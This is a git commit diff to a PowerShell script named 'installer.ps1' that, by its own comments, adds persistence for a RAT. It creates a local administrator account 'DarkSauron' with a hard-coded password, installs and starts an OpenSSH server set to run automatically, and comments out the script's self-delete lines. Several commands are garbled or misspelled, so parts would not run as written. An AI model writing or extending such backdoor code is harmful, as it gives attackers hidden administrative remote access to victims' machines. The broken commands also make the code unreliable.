5dff306a092cd82d094d023641dff605dddd3ad1
knightcoder77 <langehmanik@gmail.com>
2025-10-26 00:33:28 +0530

    this is the update one

--- files/installer.ps1
+++ files/installer.ps1
@@ -12,11 +12,48 @@
 
 
 
+#create local admin for the rat 
+function create_account {
+    [CmdletBinding()] 
+    param (
+        [string] $uname,
+        [securestring] $pword
+     )
+     begin {
+     }
+        process {
+            New-Location "$uname" -pword $pword-FullName "$uname" -Description "Temporary local admin"
+            write-Verbose "$uname local user created" Add-LocalGroupMember -Group "Administrators" -Member "$uname"
+            Write-Verbose "$uname added to  teh local administration group"
+        }
+        end{  
+        }
+
+    }
+$uname = "DarkSauron"
+$pword = (ConvertTo-Securestring "12192003"-AsPlainText -Force)
+create_account  -uname $uname -pword $pword
+
+
+
 #varaibles
 
 $wd = random_text
 $path = "$env:temp/$wd"
 $initial_dir = Get-Location
+
+
+
+
+
+
+
+
+
+
+#enabling  the presistance ssh 
+Add-WindowsCapablity -Online -Name OpenSSH.Server~~~~0.0.1.0 Start-Service  -Name sshd-StartupType 'Automatic' Get-NetFirewallRule - Name *ssh* 
+
 
 #goto temp ,make working directory
 
@@ -25,8 +62,8 @@ $initial_dir = Get-Location
  
 
  #self delete
- cd $initial_dir
- del installer.ps1
+ #cd $initial_dir
+ #del installer.ps1
 
 
 
